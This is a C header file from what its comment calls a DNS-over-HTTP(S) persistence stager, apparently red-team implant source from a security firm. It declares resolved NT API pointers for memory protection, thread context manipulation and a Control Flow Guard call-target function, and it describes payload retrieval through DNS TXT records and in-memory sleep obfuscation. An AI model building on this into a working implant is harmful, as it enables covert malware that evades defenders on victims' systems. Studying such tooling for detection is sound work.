/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#ifndef _COMMON_H_
#define _COMMON_H_

#include <windows.h>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <psapi.h>
#include <winioctl.h>
#include "tebpeb.h"
#include "apidef.h"
#include "macros.h"
#include "hashes.h"
#include "hash.h"
#include "peb.h"
#include "pe.h"

extern ULONG_PTR _GET_BEG( VOID );
extern ULONG_PTR _GET_END( VOID );

typedef struct
{
	struct
	{
		HANDLE Base;

		D_API( NtSignalAndWaitForSingleObject );
		D_API( NtQueryInformationProcess );
		D_API( NtProtectVirtualMemory );
		D_API( NtWaitForSingleObject );
		D_API( NtDeviceIoControlFile );
		D_API( RtlInitUnicodeString );
		D_API( NtAlertResumeThread );
		D_API( NtSetContextThread );
		D_API( NtGetContextThread );
		D_API( NtTerminateThread );
		D_API( RtlCaptureContext );
		D_API( NtDelayExecution );
		D_API( NtQueueApcThread );
		D_API( NtCreateThreadEx );
		D_API( RtlAllocateHeap );
		D_API( NtCreateEvent );
		D_API( NtOpenThread );
		D_API( RtlFreeHeap );
		D_API( NtTestAlert );
		D_API( NtOpenFile );
		D_API( NtContinue );
		D_API( ExitThread );
		D_API( NtClose );
	} nt;

	struct
	{
		HANDLE Base;

		D_API( SetProcessValidCallTargets );
	} kb;

	PVOID	Buffer;
	ULONG	Length;
	ULONG   Protection;
} INSTANCE, *PINSTANCE;

#include "ntmem.h"
#include "sleep.h"

#endif
